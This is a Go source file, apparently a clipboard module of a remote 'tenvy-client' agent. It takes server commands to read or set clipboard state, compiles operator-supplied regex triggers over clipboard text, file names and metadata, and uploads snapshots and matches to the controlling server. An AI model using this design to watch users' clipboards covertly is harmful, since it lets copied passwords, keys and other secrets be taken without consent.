package clipboard

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/rootbay/tenvy-client/internal/protocol"
)

type (
	Command       = protocol.Command
	CommandResult = protocol.CommandResult
)

type Logger interface {
	Printf(format string, args ...interface{})
}

type HTTPDoer interface {
	Do(req *http.Request) (*http.Response, error)
}

type Config struct {
	AgentID   string
	BaseURL   string
	AuthKey   string
	Client    HTTPDoer
	Logger    Logger
	UserAgent string
}

type Manager struct {
	cfg      atomic.Value
	mu       sync.Mutex
	sequence uint64
	state    ClipboardSnapshot
	triggers map[string]*compiledTrigger
}

type compiledTrigger struct {
	trigger ClipboardTrigger
	formats map[ClipboardFormat]struct{}
	pattern string
	regex   *regexp.Regexp
}

const requestTimeout = 10 * time.Second

func NewManager(cfg Config) *Manager {
	manager := &Manager{
		triggers: make(map[string]*compiledTrigger),
	}
	manager.updateConfig(cfg)
	return manager
}

func (m *Manager) UpdateConfig(cfg Config) {
	if m == nil {
		return
	}
	m.updateConfig(cfg)
}

func (m *Manager) updateConfig(cfg Config) {
	m.cfg.Store(cfg)
}

func (m *Manager) config() Config {
	if value := m.cfg.Load(); value != nil {
		if cfg, ok := value.(Config); ok {
			return cfg
		}
	}
	return Config{}
}

func (m *Manager) logf(format string, args ...interface{}) {
	cfg := m.config()
	if cfg.Logger == nil {
		return
	}
	cfg.Logger.Printf(format, args...)
}

func (m *Manager) userAgent() string {
	cfg := m.config()
	ua := strings.TrimSpace(cfg.UserAgent)
	if ua != "" {
		return ua
	}
	return "tenvy-client"
}

func (m *Manager) Shutdown() {}

func (m *Manager) HandleCommand(ctx context.Context, cmd Command) CommandResult {
	completedAt := time.Now().UTC().Format(time.RFC3339Nano)
	result := CommandResult{
		CommandID:   cmd.ID,
		CompletedAt: completedAt,
	}

	var payload ClipboardCommandPayload
	if len(cmd.Payload) > 0 {
		if err := json.Unmarshal(cmd.Payload, &payload); err != nil {
			result.Success = false
			result.Error = fmt.Sprintf("invalid clipboard payload: %v", err)
			return result
		}
	}

	action := strings.TrimSpace(payload.Action)
	if action == "" {
		result.Success = false
		result.Error = "clipboard action is required"
		return result
	}

	switch action {
	case "get":
		snapshot := m.snapshot()
		requestID := strings.TrimSpace(payload.RequestID)
		if requestID != "" {
			go m.dispatchState(requestID, snapshot)
		}
		result.Success = true
		result.Output = fmt.Sprintf("sequence %d", snapshot.Sequence)
		return result
	case "set":
		if payload.Content == nil {
			result.Success = false
			result.Error = "clipboard content missing"
			return result
		}
		source := strings.TrimSpace(payload.Source)
		if source == "" {
			source = "agent"
		}
		snapshot := m.applyContent(payload.Content, source, payload.Sequence)
		requestID := strings.TrimSpace(payload.RequestID)
		if requestID != "" {
			go m.dispatchState(requestID, snapshot)
		}
		result.Success = true
		result.Output = fmt.Sprintf("sequence %d", snapshot.Sequence)
		return result
	case "sync-triggers":
		if err := m.syncTriggers(payload.Triggers); err != nil {
			result.Success = false
			result.Error = err.Error()
			return result
		}
		result.Success = true
		result.Output = fmt.Sprintf("synced %d triggers", len(payload.Triggers))
		return result
	default:
		result.Success = false
		result.Error = fmt.Sprintf("unsupported clipboard action: %s", action)
		return result
	}
}

func (m *Manager) snapshot() ClipboardSnapshot {
	m.mu.Lock()
	defer m.mu.Unlock()
	snapshot := cloneSnapshot(m.state)
	if snapshot.CapturedAt == "" {
		snapshot.CapturedAt = time.Now().UTC().Format(time.RFC3339Nano)
	}
	snapshot.Sequence = m.sequence
	return snapshot
}

func (m *Manager) applyContent(content *ClipboardContent, source string, requestedSequence *uint64) ClipboardSnapshot {
	now := time.Now().UTC()
	cloned := cloneContent(content)

	m.mu.Lock()
	m.sequence++
	if requestedSequence != nil && *requestedSequence > m.sequence {
		m.sequence = *requestedSequence
	}
	seq := m.sequence
	snapshot := ClipboardSnapshot{
		Sequence:   seq,
		CapturedAt: now.Format(time.RFC3339Nano),
		Source:     source,
		Content:    cloned,
	}
	m.state = cloneSnapshot(snapshot)
	events := m.evaluateTriggersLocked(snapshot)
	m.mu.Unlock()

	if len(events) > 0 {
		go m.dispatchEvents(events)
	}

	return snapshot
}

func (m *Manager) syncTriggers(triggers []ClipboardTrigger) error {
	compiled := make(map[string]*compiledTrigger, len(triggers))
	for _, trigger := range triggers {
		record := &compiledTrigger{
			trigger: trigger,
			pattern: strings.TrimSpace(trigger.Condition.Pattern),
		}
		if len(trigger.Condition.Formats) > 0 {
			record.formats = make(map[ClipboardFormat]struct{}, len(trigger.Condition.Formats))
			for _, format := range trigger.Condition.Formats {
				record.formats[format] = struct{}{}
			}
		}
		if record.pattern != "" {
			var err error
			if trigger.Condition.CaseSensitive {
				record.regex, err = regexp.Compile(record.pattern)
			} else {
				record.regex, err = regexp.Compile("(?i)" + record.pattern)
			}
			if err != nil {
				return fmt.Errorf("invalid trigger pattern (%s): %w", trigger.ID, err)
			}
		}
		compiled[trigger.ID] = record
	}

	m.mu.Lock()
	m.triggers = compiled
	m.mu.Unlock()
	return nil
}

func (m *Manager) evaluateTriggersLocked(snapshot ClipboardSnapshot) []ClipboardTriggerEvent {
	if snapshot.Content == nil || len(m.triggers) == 0 {
		return nil
	}

	events := make([]ClipboardTriggerEvent, 0, len(m.triggers))
	for _, entry := range m.triggers {
		if entry == nil || !entry.trigger.Active {
			continue
		}
		if len(entry.formats) > 0 {
			if _, ok := entry.formats[snapshot.Content.Format]; !ok {
				continue
			}
		}
		matches := entry.matches(snapshot.Content)
		if entry.pattern != "" && len(matches) == 0 {
			continue
		}
		event := ClipboardTriggerEvent{
			EventID:      randomEventID(),
			TriggerID:    entry.trigger.ID,
			TriggerLabel: entry.trigger.Label,
			CapturedAt:   snapshot.CapturedAt,
			Sequence:     snapshot.Sequence,
			Matches:      matches,
			Content:      *cloneContent(snapshot.Content),
			Action:       entry.trigger.Action,
		}
		events = append(events, event)
	}
	if len(events) == 0 {
		return nil
	}
	return events
}

func (t *compiledTrigger) matches(content *ClipboardContent) []ClipboardTriggerMatch {
	if content == nil {
		return nil
	}
	if t.regex == nil {
		return []ClipboardTriggerMatch{{Field: "format", Value: string(content.Format)}}
	}
	matches := make([]ClipboardTriggerMatch, 0)
	switch content.Format {
	case "text":
		if content.Text != nil {
			segments := t.regex.FindAllString(content.Text.Value, -1)
			for _, segment := range segments {
				if segment != "" {
					matches = append(matches, ClipboardTriggerMatch{Field: "text", Value: segment})
				}
			}
		}
	case "files":
		for _, file := range content.Files {
			if file.Name != "" && t.regex.MatchString(file.Name) {
				matches = append(matches, ClipboardTriggerMatch{Field: "file", Value: file.Name})
				continue
			}
			if file.Path != "" && t.regex.MatchString(file.Path) {
				matches = append(matches, ClipboardTriggerMatch{Field: "file", Value: file.Path})
			}
		}
	default:
		if len(content.Metadata) > 0 {
			for key, value := range content.Metadata {
				if value != "" && t.regex.MatchString(value) {
					matches = append(matches, ClipboardTriggerMatch{Field: key, Value: value})
				}
			}
		}
	}
	return matches
}

func (m *Manager) dispatchState(requestID string, snapshot ClipboardSnapshot) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	if err := m.sendState(ctx, requestID, snapshot); err != nil {
		m.logf("clipboard: failed to dispatch state (%s): %v", requestID, err)
	}
}

func (m *Manager) dispatchEvents(events []ClipboardTriggerEvent) {
	if len(events) == 0 {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	if err := m.sendEvents(ctx, events); err != nil {
		m.logf("clipboard: failed to dispatch events: %v", err)
	}
}

func (m *Manager) sendState(ctx context.Context, requestID string, snapshot ClipboardSnapshot) error {
	payload := ClipboardStateEnvelope{RequestID: requestID, Snapshot: snapshot}
	data, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	cfg := m.config()
	baseURL := strings.TrimRight(strings.TrimSpace(cfg.BaseURL), "/")
	if baseURL == "" {
		return fmt.Errorf("clipboard: missing base URL")
	}
	if cfg.Client == nil {
		return fmt.Errorf("clipboard: missing http client")
	}

	endpoint := fmt.Sprintf("%s/api/agents/%s/clipboard/state", baseURL, url.PathEscape(cfg.AgentID))
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	if ua := strings.TrimSpace(m.userAgent()); ua != "" {
		req.Header.Set("User-Agent", ua)
	}
	if key := strings.TrimSpace(cfg.AuthKey); key != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", key))
	}

	resp, err := cfg.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		message := strings.TrimSpace(string(body))
		if message == "" {
			message = fmt.Sprintf("status %d", resp.StatusCode)
		}
		return fmt.Errorf("clipboard state upload failed: %s", message)
	}
	return nil
}

func (m *Manager) sendEvents(ctx context.Context, events []ClipboardTriggerEvent) error {
	payload := ClipboardEventEnvelope{Events: events}
	data, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	cfg := m.config()
	baseURL := strings.TrimRight(strings.TrimSpace(cfg.BaseURL), "/")
	if baseURL == "" {
		return fmt.Errorf("clipboard: missing base URL")
	}
	if cfg.Client == nil {
		return fmt.Errorf("clipboard: missing http client")
	}

	endpoint := fmt.Sprintf("%s/api/agents/%s/clipboard/events", baseURL, url.PathEscape(cfg.AgentID))
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	if ua := strings.TrimSpace(m.userAgent()); ua != "" {
		req.Header.Set("User-Agent", ua)
	}
	if key := strings.TrimSpace(cfg.AuthKey); key != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", key))
	}

	resp, err := cfg.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		message := strings.TrimSpace(string(body))
		if message == "" {
			message = fmt.Sprintf("status %d", resp.StatusCode)
		}
		return fmt.Errorf("clipboard event upload failed: %s", message)
	}
	return nil
}

func cloneSnapshot(snapshot ClipboardSnapshot) ClipboardSnapshot {
	cloned := snapshot
	if snapshot.Content != nil {
		cloned.Content = cloneContent(snapshot.Content)
	}
	return cloned
}

func cloneContent(content *ClipboardContent) *ClipboardContent {
	if content == nil {
		return nil
	}
	cloned := *content
	if content.Text != nil {
		text := *content.Text
		cloned.Text = &text
	}
	if content.Image != nil {
		image := *content.Image
		cloned.Image = &image
	}
	if len(content.Files) > 0 {
		files := make([]ClipboardFileEntry, len(content.Files))
		copy(files, content.Files)
		cloned.Files = files
	}
	if len(content.Metadata) > 0 {
		metadata := make(map[string]string, len(content.Metadata))
		for key, value := range content.Metadata {
			metadata[key] = value
		}
		cloned.Metadata = metadata
	}
	return &cloned
}

func randomEventID() string {
	buf := make([]byte, 16)
	if _, err := rand.Read(buf); err != nil {
		return fmt.Sprintf("evt-%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(buf)
}
